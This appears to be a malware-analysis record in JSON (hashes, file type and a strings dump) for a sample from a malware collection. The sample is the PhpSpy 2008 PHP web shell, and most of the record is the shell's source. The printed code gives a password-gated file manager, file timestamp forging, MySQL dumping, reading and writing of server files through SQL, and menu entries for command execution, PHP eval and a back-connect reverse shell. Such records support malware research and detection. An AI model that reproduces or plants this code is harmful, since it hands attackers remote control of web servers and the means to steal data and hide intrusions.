$arg['rows'] = 25;\n\t$arg['title'] = $arg['title'] ? $arg['title'].'<br />' : '';\n\tp(\"<p>$arg[title]<textarea class=\\\"area\\\" id=\\\"$arg[name]\\\" name=\\\"$arg[name]\\\" cols=\\\"$arg[cols]\\\" rows=\\\"$arg[rows]\\\" $arg[extra]>$arg[value]</textarea></p>\");\n}\n\nfunction formfooter($name = ''){\n\t!$name && $name = 'submit';\n\tp('<p><input class=\"bt\" name=\"'.$name.'\" id=\\\"'.$name.'\\\" type=\"submit\" value=\"Submit\"></p>');\n\tp('</form>');\n}\n\nfunction formfoot(){\n\tp('</form>');\n}\n\n// ????\nfunction pr($a) {\n\techo '<pre>';\n\tprint_r($a);\n\techo '</pre>';\n}\n\n?>\n"
    },
    "filename": "VirusShare_2123e6fd8e30f7c043c097a6b815e834",
    "filesize": 68500,
    "filetype": "PHP script, ASCII text, with very long lines, with CRLF line terminators",
    "hashes": {
        "md5": "2123e6fd8e30f7c043c097a6b815e834",
        "sha1": "52810b2f09d22b78197bacd16bb2004001a3f896",
        "sha256": "d90132dd99b4acdaefc28448691a1f936698b2e943e4a59938f7cf6da30eeaca"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "<?php",
            "/*****************************************************************************",
            "===================== ????????,????????????====================",
            "????????????????????",
            "??????????:Sniper\\Super?ei\\kEvin1986\\saiy\\wofeiwo?",
            "???????????????????????!",
            "???1?7??????????????,?????????????!",
            "====================== ?????????????????? =======================",
            "Codz by angel(4ngel)",
            "Make in China",
            "Web: http://www.4ngel.net",
            "*****************************************************************************/",
            "error_reporting(7);",
            "@set_magic_quotes_runtime(0);",
            "ob_start();",
            "$mtime = explode(' ', microtime());",
            "$starttime = $mtime[1] + $mtime[0];",
            "define('SA_ROOT', str_replace('\\\\', '/', dirname(__FILE__)).'/');",
            "//define('IS_WIN', strstr(PHP_OS, 'WIN') ? 1 : 0 );",
            "define('IS_WIN', DIRECTORY_SEPARATOR == '\\\\');",
            "define('IS_COM', class_exists('COM') ? 1 : 0 );",
            "define('IS_GPC', get_magic_quotes_gpc());",
            "$dis_func = get_cfg_var('disable_functions');",
            "define('IS_PHPINFO', (!eregi(\"phpinfo\",$dis_func)) ? 1 : 0 );",
            "@set_time_limit(0);",
            "foreach(array('_GET','_POST') as $_request) {",
            "\tforeach($$_request as $_key => $_value) {",
            "\t\tif ($_key{0} != '_') {",
            "\t\t\tif (IS_GPC) {",
            "\t\t\t\t$_value = s_array($_value);",
            "\t\t\t}",
            "\t\t\t$$_key = $_value;",
            "/*===================== ???? =====================*/",
            "$admin = array();",
            "// ????????, true ?????, false ?????.???????",
            "$admin['check'] = true;",
            "// ????????,???????",
            "$admin['pass']  = 's0d';",
            "//??? cookie ?????????, ??????, ???????, ???????",
            "// cookie ??",
            "$admin['cookiepre'] = '';",
            "// cookie ???",
            "$admin['cookiedomain'] = '';",
            "// cookie ????",
            "$admin['cookiepath'] = '/';",
            "// cookie ???",
            "$admin['cookielife'] = 86400;",
            "/*===================== ???? =====================*/",
            "if ($charset == 'utf8') {",
            "\theader(\"content-Type: text/html; charset=utf-8\");",
            "} elseif ($charset == 'big5') {",
            "\theader(\"content-Type: text/html; charset=big5\");",
            "} elseif ($charset == 'gbk') {",
            "\theader(\"content-Type: text/html; charset=gbk\");",
            "} elseif ($charset == 'latin1') {",
            "\theader(\"content-Type: text/html; charset=iso-8859-2\");",
            "$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];",
            "$timestamp = time();",
            "/*===================== ???? =====================*/",
            "if ($action == \"logout\") {",
            "\tscookie('phpspypass', '', -86400 * 365);",
            "\tp('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');",
            "\tp('<a style=\"font:12px Verdana\" href=\"'.$self.'\">Success</a>');",
            "\texit;",
            "if($admin['check']) {",
            "\tif ($doing == 'login') {",
            "\t\tif ($admin['pass'] == $password) {",
            "\t\t\tscookie('phpspypass', $password);",
            "\t\t\tp('<meta http-equiv=\"refresh\" content=\"1;URL='.$self.'\">');",
            "\t\t\tp('<a style=\"font:12px Verdana\" href=\"'.$self.'\">Success</a>');",
            "\t\t\texit;",
            "\tif ($_COOKIE['phpspypass']) {",
            "\t\tif ($_COOKIE['phpspypass'] != $admin['pass']) {",
            "\t\t\tloginpage();",
            "\t} else {",
            "\t\tloginpage();",
            "/*===================== ???? =====================*/",
            "$errmsg = '';",
            "// ??PHPINFO",
            "if ($action == 'phpinfo') {",
            "\tif (IS_PHPINFO) {",
            "\t\tphpinfo();",
            "\t} else {",
            "\t\t$errmsg = 'phpinfo() function has non-permissible';",
            "// ????",
            "if ($doing == 'downfile' && $thefile) {",
            "\tif (!@file_exists($thefile)) {",
            "\t\t$errmsg = 'The file you want Downloadable was nonexistent';",
            "\t} else {",
            "\t\t$fileinfo = pathinfo($thefile);",
            "\t\theader('Content-type: application/x-'.$fileinfo['extension']);",
            "\t\theader('Content-Disposition: attachment; filename='.$fileinfo['basename']);",
            "\t\theader('Content-Length: '.filesize($thefile));",
            "\t\t@readfile($thefile);",
            "\t\texit;",
            "// ?????????",
            "if ($doing == 'backupmysql' && !$saveasfile) {",
            "\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);",
            "\t$table = array_flip($table);",
            "\t$result = q(\"SHOW tables\");",
            "\tif (!$result) p('<h2>'.mysql_error().'</h2>');",
            "\t$filename = basename($_SERVER['HTTP_HOST'].'_MySQL.sql');",
            "\theader('Content-type: application/unknown');",
            "\theader('Content-Disposition: attachment; filename='.$filename);",
            "\t$mysqldata = '';",
            "\twhile ($currow = mysql_fetch_array($result)) {",
            "\t\tif (isset($table[$currow[0]])) {",
            "\t\t\t$mysqldata .= sqldumptable($currow[0]);",
            "\tmysql_close();",
            "\texit;",
            "// ??MYSQL????",
            "if($doing=='mysqldown'){",
            "\tif (!$dbname) {",
            "\t\t$errmsg = 'Please input dbname';",
            "\t} else {",
            "\t\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);",
            "\t\tif (!file_exists($mysqldlfile)) {",
            "\t\t\t$errmsg = 'The file you want Downloadable was nonexistent';",
            "\t\t} else {",
            "\t\t\t$result = q(\"select load_file('$mysqldlfile');\");",
            "\t\t\tif(!$result){",
            "\t\t\t\tq(\"DROP TABLE IF EXISTS tmp_angel;\");",
            "\t\t\t\tq(\"CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);\");",
            "\t\t\t\t//?????????,???????????__angel_1111111111_eof__??????????",
            "\t\t\t\tq(\"LOAD DATA LOCAL INFILE '\".addslashes($mysqldlfile).\"' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';\");",
            "\t\t\t\t$result = q(\"select content from tmp_angel\");",
            "\t\t\t\tq(\"DROP TABLE tmp_angel\");",
            "\t\t\t}",
            "\t\t\t$row = @mysql_fetch_array($result);",
            "\t\t\tif (!$row) {",
            "\t\t\t\t$errmsg = 'Load file failed '.mysql_error();",
            "\t\t\t} else {",
            "\t\t\t\t$fileinfo = pathinfo($mysqldlfile);",
            "\t\t\t\theader('Content-type: application/x-'.$fileinfo['extension']);",
            "\t\t\t\theader('Content-Disposition: attachment; filename='.$fileinfo['basename']);",
            "\t\t\t\theader(\"Accept-Length: \".strlen($row[0]));",
            "\t\t\t\techo $row[0];",
            "\t\t\t\texit;",
            "\t\t\t}",
            "<html>",
            "<head>",
            "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gbk\">",
            "<title><?php echo str_replace('.','','P.h.p.S.p.y');?></title>",
            "<style type=\"text/css\">",
            "body,td{font: 12px Arial,Tahoma;line-height: 16px;}",
            ".input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}",
            ".area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}",
            ".bt {border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:22px;}",
            "a {color: #00f;text-decoration:underline;}",
            "a:hover{color: #f00;text-decoration:none;}",
            ".alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 10px 5px 5px;}",
            ".alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 10px 5px 5px;}",
            ".focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 10px 5px 5px;}",
            ".head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 10px 5px 5px;font-weight:bold;}",
            ".head td span{font-weight:normal;}",
            "form{margin:0;padding:0;}",
            "h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}",
            "ul.info li{margin:0;color:#444;line-height:24px;height:24px;}",
            "u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}",
            "</style>",
            "<script type=\"text/javascript\">",
            "function CheckAll(form) {",
            "\tfor(var i=0;i<form.elements.length;i++) {",
            "\t\tvar e = form.elements[i];",
            "\t\tif (e.name != 'chkall')",
            "\t\te.checked = form.chkall.checked;",
            "    }",
            "function $(id) {",
            "\treturn document.getElementById(id);",
            "function goaction(act){",
            "\t$('goaction').action.value=act;",
            "\t$('goaction').submit();",
            "</script>",
            "</head>",
            "<body style=\"margin:0;table-layout:fixed; word-break:break-all\">",
            "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\">",
            "\t<tr class=\"head\">",
            "\t\t<td><span style=\"float:right;\"><a href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p.y');?> Ver: 2008</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>",
            "\t</tr>",
            "\t<tr class=\"alt1\">",
            "\t\t<td><span style=\"float:right;\">Safe Mode:<?php echo getcfg('safe_mode');?></span>",
            "\t\t\t<a href=\"javascript:goaction('logout');\">Logout</a> | ",
            "\t\t\t<a href=\"javascript:goaction('file');\">File Manager</a> | ",
            "\t\t\t<a href=\"javascript:goaction('sqladmin');\">MySQL Manager</a> | ",
            "\t\t\t<a href=\"javascript:goaction('sqlfile');\">MySQL Upload &amp; Download</a> | ",
            "\t\t\t<a href=\"javascript:goaction('shell');\">Execute Command</a> | ",
            "\t\t\t<a href=\"javascript:goaction('phpenv');\">PHP Variable</a> | ",
            "\t\t\t<a href=\"javascript:goaction('eval');\">Eval PHP Code</a>",
            "\t\t\t<?php if (!IS_WIN) {?> | <a href=\"javascript:goaction('backconnect');\">Back Connect</a><?php }?>",
            "\t\t</td>",
            "\t</tr>",
            "</table>",
            "<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>",
            "<?php",
            "formhead(array('name'=>'goaction'));",
            "makehide('action');",
            "formfoot();",
            "$errmsg && m($errmsg);",
            "// ??????",
            "!$dir && $dir = '.';",
            "$nowpath = getPath(SA_ROOT, $dir);",
            "if (substr($dir, -1) != '/') {",
            "\t$dir = $dir.'/';",
            "$uedir = ue($dir);",
            "if (!$action || $action == 'file') {",
            "\t// ??????",
            "\t$dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';",
            "\t// ????",
            "\tif ($doing == 'deldir' && $thefile) {",
            "\t\tif (!file_exists($thefile)) {",
            "\t\t\tm($thefile.' directory does not exist');",
            "\t\t} else {",
            "\t\t\tm('Directory delete '.(deltree($thefile) ? basename($thefile).' success' : 'failed'));",
            "\t// ????",
            "\telseif ($newdirname) {",
            "\t\t$mkdirs = $nowpath.$newdirname;",
            "\t\tif (file_exists($mkdirs)) {",
            "\t\t\tm('Directory has already existed');",
            "\t\t} else {",
            "\t\t\tm('Directory created '.(@mkdir($mkdirs,0777) ? 'success' : 'failed'));",
            "\t\t\t@chmod($mkdirs,0777);",
            "\t// ????",
            "\telseif ($doupfile) {",
            "\t\tm('File upload '.(@copy($_FILES['uploadfile']['tmp_name'],$uploaddir.'/'.$_FILES['uploadfile']['name']) ? 'success' : 'failed'));",
            "\t// ????",
            "\telseif ($editfilename && $filecontent) {",
            "\t\t$fp = @fopen($editfilename,'w');",
            "\t\tm('Save file '.(@fwrite($fp,$filecontent) ? 'success' : 'failed'));",
            "\t\t@fclose($fp);",
            "\t// ??????",
            "\telseif ($pfile && $newperm) {",
            "\t\tif (!file_exists($pfile)) {",
            "\t\t\tm('The original file does not exist');",
            "\t\t} else {",
            "\t\t\t$newperm = base_convert($newperm,8,10);",
            "\t\t\tm('Modify file attributes '.(@chmod($pfile,$newperm) ? 'success' : 'failed'));",
            "\t// ??",
            "\telseif ($oldname && $newfilename) {",
            "\t\t$nname = $nowpath.$newfilename;",
            "\t\tif (file_exists($nname) || !file_exists($oldname)) {",
            "\t\t\tm($nname.' has already existed or original file does not exist');",
            "\t\t} else {",
            "\t\t\tm(basename($oldname).' renamed '.basename($nname).(@rename($oldname,$nname) ? ' success' : 'failed'));",
            "\t// ????",
            "\telseif ($sname && $tofile) {",
            "\t\tif (file_exists($tofile) || !file_exists($sname)) {",
            "\t\t\tm('The goal file has already existed or original file does not exist');",
            "\t\t} else {",
            "\t\t\tm(basename($tofile).' copied '.(@copy($sname,$tofile) ? basename($tofile).' success' : 'failed'));",
            "\t// ????",
            "\telseif ($curfile && $tarfile) {",
            "\t\tif (!@file_exists($curfile) || !@file_exists($tarfile)) {",
            "\t\t\tm('The goal file has already existed or original file does not exist');",
            "\t\t} else {",
            "\t\t\t$time = @filemtime($tarfile);",
            "\t\t\tm('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));",
            "\t// ?????",
            "\telseif ($curfile && $year && $month && $day && $hour && $minute && $second) {",
            "\t\tif (!@file_exists($curfile)) {",
            "\t\t\tm(basename($curfile).' does not exist');",
            "\t\t} else {",
            "\t\t\t$time = strtotime(\"$year-$month-$day $hour:$minute:$second\");",
            "\t\t\tm('Modify file the last modified '.(@touch($curfile,$time,$time) ? 'success' : 'failed'));",
            "\t// ????",
            "\telseif($doing == 'downrar') {",
            "\t\tif ($dl) {",
            "\t\t\t$dfiles='';",
            "\t\t\tforeach ($dl as $filepath => $value) {",
            "\t\t\t\t$dfiles.=$filepath.',';",
            "\t\t\t}",
            "\t\t\t$dfiles=substr($dfiles,0,strlen($dfiles)-1);",
            "\t\t\t$dl=explode(',',$dfiles);",
            "\t\t\t$zip=new PHPZip($dl);",
            "\t\t\t$code=$zip->out;",
            "\t\t\theader('Content-type: application/octet-stream');",
            "\t\t\theader('Accept-Ranges: bytes');",
            "\t\t\theader('Accept-Length: '.strlen($code));",
            "\t\t\theader('Content-Disposition: attachment;filename='.$_SERVER['HTTP_HOST'].'_Files.tar.gz');",
            "\t\t\techo $code;",
            "\t\t\texit;",
            "\t\t} else {",
            "\t\t\tm('Please select file(s)');",
            "\t// ??????",
            "\telseif($doing == 'delfiles') {",
            "\t\tif ($dl) {",
            "\t\t\t$dfiles='';",
            "\t\t\t$succ = $fail = 0;",
            "\t\t\tforeach ($dl as $filepath => $value) {",
            "\t\t\t\tif (@unlink($filepath)) {",
            "\t\t\t\t\t$succ++;",
            "\t\t\t\t} else {",
            "\t\t\t\t\t$fail++;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\tm('Deleted file have finished,choose '.count($dl).' success '.$succ.' fail '.$fail);",
            "\t\t} else {",
            "\t\t\tm('Please select file(s)');",
            "\t//????",
            "\tformhead(array('name'=>'createdir'));",
            "\tmakehide('newdirname');",
            "\tmakehide('dir',$nowpath);",
            "\tformfoot();",
            "\tformhead(array('name'=>'fileperm'));",
            "\tmakehide('newperm');",
            "\tmakehide('pfile');",
            "\tmakehide('dir',$nowpath);",
            "\tformfoot();",
            "\tformhead(array('name'=>'copyfile'));",
            "\tmakehide('sname');",
            "\tmakehide('tofile');",
            "\tmakehide('dir',$nowpath);",
            "\tformfoot();",
            "\tformhead(array('name'=>'rename'));",
            "\tmakehide('oldname');",
            "\tmakehide('newfilename');",
            "\tmakehide('dir',$nowpath);",
            "\tformfoot();",
            "\tformhead(array('name'=>'fileopform'));",
            "\tmakehide('action');",
            "\tmakehide('opfile');",
            "\tmakehide('dir');",
            "\tformfoot();",
            "\t$free = @disk_free_space($nowpath);",
            "\t!$free && $free = 0;",
            "\t$all = @disk_total_space($nowpath);",
            "\t!$all && $all = 0;",
            "\t$used = $all-$free;",
            "\t$used_percent = @round(100/($all/$free),2);",
            "\tp('<h2>File Manager - Current disk free '.sizecount($free).' of '.sizecount($all).' ('.$used_percent.'%)</h2>');",
            "<table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" style=\"margin:10px 0;\">",
            "  <form action=\"\" method=\"post\" id=\"godir\" name=\"godir\">",
            "  <tr>",
            "    <td nowrap>Current Directory (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>",
            "\t<td width=\"100%\"><input name=\"view_writable\" value=\"0\" type=\"hidden\" /><input class=\"input\" name=\"dir\" value=\"<?php echo $nowpath;?>\" type=\"text\" style=\"width:100%;margin:0 8px;\"></td>",
            "    <td nowrap><input class=\"bt\" value=\"GO\" type=\"submit\"></td>",
            "  </tr>",
            "  </form>",
            "</table>",
            "<script type=\"text/javascript\">",
            "function createdir(){",
            "\tvar newdirname;",
            "\tnewdirname = prompt('Please input the directory name:', '');",
            "\tif (!newdirname) return;",
            "\t$('createdir').newdirname.value=newdirname;",
            "\t$('createdir').submit();",
            "function fileperm(pfile){",
            "\tvar newperm;",
            "\tnewperm = prompt('Current file:'+pfile+'\\nPlease input new attribute:', '');",
            "\tif (!newperm) return;",
            "\t$('fileperm').newperm.value=newperm;",
            "\t$('fileperm').pfile.value=pfile;",
            "\t$('fileperm').submit();",
            "function copyfile(sname){",
            "\tvar tofile;",
            "\ttofile = prompt('Original file:'+sname+'\\nPlease input object file (fullpath):', '');",
            "\tif (!tofile) return;",
            "\t$('copyfile').tofile.value=tofile;",
            "\t$('copyfile').sname.value=sname;",
            "\t$('copyfile').submit();",
            "function rename(oldname){",
            "\tvar newfilename;",
            "\tnewfilename = prompt('Former file name:'+oldname+'\\nPlease input new filename:', '');",
            "\tif (!newfilename) return;",
            "\t$('rename').newfilename.value=newfilename;",
            "\t$('rename').oldname.value=oldname;",
            "\t$('rename').submit();",
            "function dofile(doing,thefile,m){",
            "\tif (m && !confirm(m)) {",
            "\t\treturn;",
            "\t$('filelist').doing.value=doing;",
            "\tif (thefile){",
            "\t\t$('filelist').thefile.value=thefile;",
            "\t$('filelist').submit();",
            "function createfile(nowpath){",
            "\tvar filename;",
            "\tfilename = prompt('Please input the file name:', '');",
            "\tif (!filename) return;",
            "\topfile('editfile',nowpath + filename,nowpath);",
            "function opfile(action,opfile,dir){",
            "\t$('fileopform').action.value=action;",
            "\t$('fileopform').opfile.value=opfile;",
            "\t$('fileopform').dir.value=dir;",
            "\t$('fileopform').submit();",
            "function godir(dir,view_writable){",
            "\tif (view_writable) {",
            "\t\t$('godir').view_writable.value=1;",
            "\t$('godir').dir.value=dir;",
            "\t$('godir').submit();",
            "</script>",
            "  <?php",
            "\ttbhead();",
            "\tp('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\"><tr class=\"alt1\"><td colspan=\"7\" style=\"padding:5px;\">');",
            "\tp('<div style=\"float:right;\"><input class=\"input\" name=\"uploadfile\" value=\"\" type=\"file\" /> <input class=\"bt\" name=\"doupfile\" value=\"Upload\" type=\"submit\" /><input name=\"uploaddir\" value=\"'.$dir.'\" type=\"hidden\" /><input name=\"dir\" value=\"'.$dir.'\" type=\"hidden\" /></div>');",
            "\tp('<a href=\"javascript:godir(\\''.$_SERVER[\"DOCUMENT_ROOT\"].'\\');\">WebRoot</a>');",
            "\tif ($view_writable) {",
            "\t\tp(' | <a href=\"javascript:godir(\\''.$nowpath.'\\');\">View All</a>');",
            "\t} else {",
            "\t\tp(' | <a href=\"javascript:godir(\\''.$nowpath.'\\',\\'1\\');\">View Writable</a>');",
            "\tp(' | <a href=\"javascript:createdir();\">Create Directory</a> | <a href=\"javascript:createfile(\\''.$nowpath.'\\');\">Create File</a>');",
            "\tif (IS_WIN && IS_COM) {",
            "\t\t$obj = new COM('scripting.filesystemobject');",
            "\t\tif ($obj && is_object($obj)) {",
            "\t\t\t$DriveTypeDB = array(0 => 'Unknow',1 => 'Removable',2 => 'Fixed',3 => 'Network',4 => 'CDRom',5 => 'RAM Disk');",
            "\t\t\tforeach($obj->Drives as $drive) {",
            "\t\t\t\tif ($drive->DriveType == 2) {",
            "\t\t\t\t\tp(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Size:'.sizecount($drive->TotalSize).'&#13;Free:'.sizecount($drive->FreeSpace).'&#13;Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');",
            "\t\t\t\t} else {",
            "\t\t\t\t\tp(' | <a href=\"javascript:godir(\\''.$drive->Path.'/\\');\" title=\"Type:'.$DriveTypeDB[$drive->DriveType].'\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');",
            "\t\t\t\t}",
            "\t\t\t}",
            "\tp('</td></tr></form>');",
            "\tp('<tr class=\"head\"><td>&nbsp;</td><td>Filename</td><td width=\"16%\">Last modified</td><td width=\"10%\">Size</td><td width=\"20%\">Chmod / Perms</td><td width=\"22%\">Action</td></tr>');",
            "\t//???????????",
            "\t$dirdata=array();",
            "\t$filedata=array();",
            "\tif ($view_writable) {",
            "\t\t$dirdata = GetList($nowpath);",
            "\t} else {",
            "\t\t// ????",
            "\t\t$dirs=@opendir($dir);",
            "\t\twhile ($file=@readdir($dirs)) {",
            "\t\t\t$filepath=$nowpath.$file;",
            "\t\t\tif(@is_dir($filepath)){",
            "\t\t\t\t$dirdb['filename']=$file;",
            "\t\t\t\t$dirdb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));",
            "\t\t\t\t$dirdb['dirchmod']=getChmod($filepath);",
            "\t\t\t\t$dirdb['dirperm']=getPerms($filepath);",
            "\t\t\t\t$dirdb['fileowner']=getUser($filepath);",
            "\t\t\t\t$dirdb['dirlink']=$nowpath;",
            "\t\t\t\t$dirdb['server_link']=$filepath;",
            "\t\t\t\t$dirdb['client_link']=ue($filepath);",
            "\t\t\t\t$dirdata[]=$dirdb;",
            "\t\t\t} else {\t\t",
            "\t\t\t\t$filedb['filename']=$file;",
            "\t\t\t\t$filedb['size']=sizecount(@filesize($filepath));",
            "\t\t\t\t$filedb['mtime']=@date('Y-m-d H:i:s',filemtime($filepath));",
            "\t\t\t\t$filedb['filechmod']=getChmod($filepath);",
            "\t\t\t\t$filedb['fileperm']=getPerms($filepath);",
            "\t\t\t\t$filedb['fileowner']=getUser($filepath);",
            "\t\t\t\t$filedb['dirlink']=$nowpath;",
            "\t\t\t\t$filedb['server_link']=$filepath;",
            "\t\t\t\t$filedb['client_link']=ue($filepath);",
            "\t\t\t\t$filedata[]=$filedb;",
            "\t\t\t}",
            "\t\t}// while",
            "\t\tunset($dirdb);",
            "\t\tunset($filedb);",
            "\t\t@closedir($dirs);",
            "\t@sort($dirdata);",
            "\t@sort($filedata);",
            "\t$dir_i = '0';",
            "\tforeach($dirdata as $key => $dirdb){",
            "\t\tif($dirdb['filename']!='..' && $dirdb['filename']!='.') {",
            "\t\t\t$thisbg = bg();",
            "\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\tp('<td width=\"2%\" nowrap><font face=\"wingdings\" size=\"3\">0</font></td>');",
            "\t\t\tp('<td><a href=\"javascript:godir(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['filename'].'</a></td>');",
            "\t\t\tp('<td nowrap>'.$dirdb['mtime'].'</td>');",
            "\t\t\tp('<td nowrap>--</td>');",
            "\t\t\tp('<td nowrap>');",
            "\t\t\tp('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirchmod'].'</a> / ');",
            "\t\t\tp('<a href=\"javascript:fileperm(\\''.$dirdb['server_link'].'\\');\">'.$dirdb['dirperm'].'</a>'.$dirdb['fileowner'].'</td>');",
            "\t\t\tp('<td nowrap><a href=\"javascript:dofile(\\'deldir\\',\\''.$dirdb['server_link'].'\\',\\'Are you sure will delete '.$dirdb['filename'].'? \\\\n\\\\nIf non-empty directory, will be delete all the files.\\')\">Del</a> | <a href=\"javascript:rename(\\''.$dirdb['server_link'].'\\');\">Rename</a></td>');",
            "\t\t\tp('</tr>');",
            "\t\t\t$dir_i++;",
            "\t\t} else {",
            "\t\t\tif($dirdb['filename']=='..') {",
            "\t\t\t\tp('<tr class='.bg().'>');",
            "\t\t\t\tp('<td align=\"center\"><font face=\"Wingdings 3\" size=4>=</font></td><td nowrap colspan=\"5\"><a href=\"javascript:godir(\\''.getUpPath($nowpath).'\\');\">Parent Directory</a></td>');",
            "\t\t\t\tp('</tr>');",
            "\t\t\t}",
            "\tp('<tr bgcolor=\"#dddddd\" stlye=\"border-top:1px solid #fff;border-bottom:1px solid #ddd;\"><td colspan=\"6\" height=\"5\"></td></tr>');",
            "\tp('<form id=\"filelist\" name=\"filelist\" action=\"'.$self.'\" method=\"post\">');",
            "\tmakehide('action','file');",
            "\tmakehide('thefile');",
            "\tmakehide('doing');",
            "\tmakehide('dir',$nowpath);",
            "\t$file_i = '0';",
            "\tforeach($filedata as $key => $filedb){",
            "\t\tif($filedb['filename']!='..' && $filedb['filename']!='.') {",
            "\t\t\t$fileurl = str_replace(SA_ROOT,'',$filedb['server_link']);",
            "\t\t\t$thisbg = bg();",
            "\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\tp('<td width=\"2%\" nowrap><input type=\"checkbox\" value=\"1\" name=\"dl['.$filedb['server_link'].']\"></td>');",
            "\t\t\tp('<td><a href=\"'.$fileurl.'\" target=\"_blank\">'.$filedb['filename'].'</a></td>');",
            "\t\t\tp('<td nowrap>'.$filedb['mtime'].'</td>');",
            "\t\t\tp('<td nowrap>'.$filedb['size'].'</td>');",
            "\t\t\tp('<td nowrap>');",
            "\t\t\tp('<a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\">'.$filedb['filechmod'].'</a> / ');",
            "\t\t\tp('<a href=\"javascript:fileperm(\\''.$filedb['server_link'].'\\');\">'.$filedb['fileperm'].'</a>'.$filedb['fileowner'].'</td>');",
            "\t\t\tp('<td nowrap>');",
            "\t\t\tp('<a href=\"javascript:dofile(\\'downfile\\',\\''.$filedb['server_link'].'\\');\">Down</a> | ');",
            "\t\t\tp('<a href=\"javascript:copyfile(\\''.$filedb['server_link'].'\\');\">Copy</a> | ');",
            "\t\t\tp('<a href=\"javascript:opfile(\\'editfile\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Edit</a> | ');",
            "\t\t\tp('<a href=\"javascript:rename(\\''.$filedb['server_link'].'\\');\">Rename</a> | ');",
            "\t\t\tp('<a href=\"javascript:opfile(\\'newtime\\',\\''.$filedb['server_link'].'\\',\\''.$filedb['dirlink'].'\\');\">Time</a>');",
            "\t\t\tp('</td></tr>');",
            "\t\t\t$file_i++;",
            "\tp('<tr class=\"'.bg().'\"><td align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form)\" /></td><td><a href=\"javascript:dofile(\\'downrar\\');\">Packing download selected</a> - <a href=\"javascript:dofile(\\'delfiles\\');\">Delete selected</a></td><td colspan=\"4\" align=\"right\">'.$dir_i.' directories / '.$file_i.' files</td></tr>');",
            "\tp('</form></table>');",
            "}// end dir",
            "elseif ($action == 'sqlfile') {",
            "\tif($doing==\"mysqlupload\"){",
            "\t\t$file = $_FILES['uploadfile'];",
            "\t\t$filename = $file['tmp_name'];",
            "\t\tif (file_exists($savepath)) {",
            "\t\t\tm('The goal file has already existed');",
            "\t\t} else {",
            "\t\t\tif(!$filename) {",
            "\t\t\t\tm('Please choose a file');",
            "\t\t\t} else {",
            "\t\t\t\t$fp=@fopen($filename,'r');",
            "\t\t\t\t$contents=@fread($fp, filesize($filename));",
            "\t\t\t\t@fclose($fp);",
            "\t\t\t\t$contents = bin2hex($contents);",
            "\t\t\t\tif(!$upname) $upname = $file['name'];",
            "\t\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\t\t\t$result = q(\"SELECT 0x{$contents} FROM mysql.user INTO DUMPFILE '$savepath';\");",
            "\t\t\t\tm($result ? 'Upload success' : 'Upload has failed: '.mysql_error());",
            "\t\t\t}",
            "<script type=\"text/javascript\">",
            "function mysqlfile(doing){",
            "\tif(!doing) return;",
            "\t$('doing').value=doing;",
            "\t$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;",
            "\t$('mysqlfile').dbport.value=$('dbinfo').dbport.value;",
            "\t$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;",
            "\t$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;",
            "\t$('mysqlfile').dbname.value=$('dbinfo').dbname.value;",
            "\t$('mysqlfile').charset.value=$('dbinfo').charset.value;",
            "\t$('mysqlfile').submit();",
            "</script>",
            "<?php",
            "\t!$dbhost && $dbhost = 'localhost';",
            "\t!$dbuser && $dbuser = 'root';",
            "\t!$dbport && $dbport = '3306';",
